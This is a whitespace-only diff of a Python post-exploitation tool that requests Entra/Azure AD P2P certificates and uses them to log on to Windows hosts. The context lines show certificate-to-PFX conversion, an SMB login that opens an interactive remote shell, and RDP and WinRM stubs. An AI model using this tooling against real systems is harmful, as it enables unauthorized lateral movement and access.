@@ -81,7 +81,7 @@ def generate_csr(common_name):
 def pem_to_pfx(key_pem, cert_pem, pfx_outpath, password):
     key = serialization.load_pem_private_key(key_pem, password=None)
     cert = x509.load_pem_x509_certificate(cert_pem)
-    
+
     pfx_data = pkcs12.serialize_key_and_certificates(
         name=b"AzureAD-P2PCert",
         key=key,
@@ -193,7 +193,7 @@ def smbclient(target, pfx, pfxpass):
         if not smbcon.kerberosCertificateLogin(pfx, pfxpass):
             error('failed to login via P2P cert. maybe target doesn\'t support PKU2U authentication or not Entra joinned')
             return
-        
+
         success('sucessfully logged-on to the system!')
         shell = MiniImpacketShell(smbcon, None, None)
         shell.cmdloop()
@@ -207,7 +207,7 @@ def smbclient(target, pfx, pfxpass):
 def rdpclient(target, username, password, pfx, pfxpass):
     info(f'connecting to {target} via RDP...')
     rdpcon = RDP(target, username, password, pfx, pfxpass)
-    rdpcon.connect()        
+    rdpcon.connect()
     return
 
 def winrmclient(target, pfx, pfxpass):
@@ -230,7 +230,7 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(
         description="post-exploitation tool for requesting p2p cert and authenticate with it"
     )
-    
+
     parser.add_argument('--debug', action='store_true',  help='debug option')
     subparsers = parser.add_subparsers(dest="command", required=True, help="Available commands")
 
@@ -281,4 +281,4 @@ if __name__ == "__main__":
         error(f'something went wrong:\n{e}')
         if args.debug:
             traceback.print_exc()
-        
+
